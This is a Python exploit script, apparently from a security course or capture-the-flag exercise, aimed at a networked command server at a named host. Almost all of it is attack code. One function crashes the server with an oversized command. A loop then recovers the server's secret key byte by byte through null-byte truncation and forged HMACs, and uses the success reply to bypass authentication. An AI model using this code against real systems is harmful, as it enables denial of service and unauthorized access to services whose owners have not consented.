import socket
import hmac
import hashlib
import time
import sys


printable_characters = []

for i in range(32, 256):
    printable_characters.append(chr(i).encode("latin-1"))


USER_NAME = b"241153"
TAG = b"ClientCmd"
command_o = b'a' * 31
DILIMIT = b"|"

# fucntion to generate HMAC value, return HMAC value
def generate_hmac(sec_key):

    total_parameter = TAG + DILIMIT + USER_NAME + DILIMIT + command_o + sec_key
    print(total_parameter)
    generated_hmac = hmac.new(sec_key, total_parameter, hashlib.sha256).hexdigest()

    return generated_hmac


HOST = 'device1.vikaa.fi'  # The server's hostname or IP address
PORT = 35984       # The port used by the server

# function to send command and key to server, return data which contain
# b'Authentication successful. Processing command.\n' if key is correct
def deliver_to_server(an_hmac, key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print('server connected')
        s.sendall(b'241153;' + command_o + key + b';' + an_hmac.encode("latin-1") + b'\n')
        print('data sent')
        data = s.recv(1024)
        print("returned data from fun deliver... = ", data)
        return data



def crash_server():
    command = b'a' * 89
    key = 'bbbbbbbbbbbbbbbbbbbb'
    hmac = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(b'241153;' + command + key.encode("latin-1") + b';' + hmac.encode("latin-1") + b'\n')

        print('data sent')

        data = s.recv(1024)
        print("data = ", data)


key_components = []


while len(key_components) < 20:
    crash_server()
    time.sleep(10)

    for i in range(len(printable_characters)):
        key_components.reverse()
        guess_key = b'b'*(19-len(key_components)-1) + b'\0' + printable_characters[i] + b''.join(key_components)
        #guess_key = b'x'*19
        print(guess_key)
        hhmacc = generate_hmac(guess_key)

        part_key = b'b'*(19-len(key_components)-1)
        #part_key = b'x'*19
        print(part_key)

        data = deliver_to_server(hhmacc, part_key)

        if "successful" in data.decode("latin-1"):
            key_components.append(printable_characters[i])
            crash_server()
            # time.sleep(8)
            sys.exit()
            print("Authentication successful")

        else:
            continue
    # break



print(key_components)





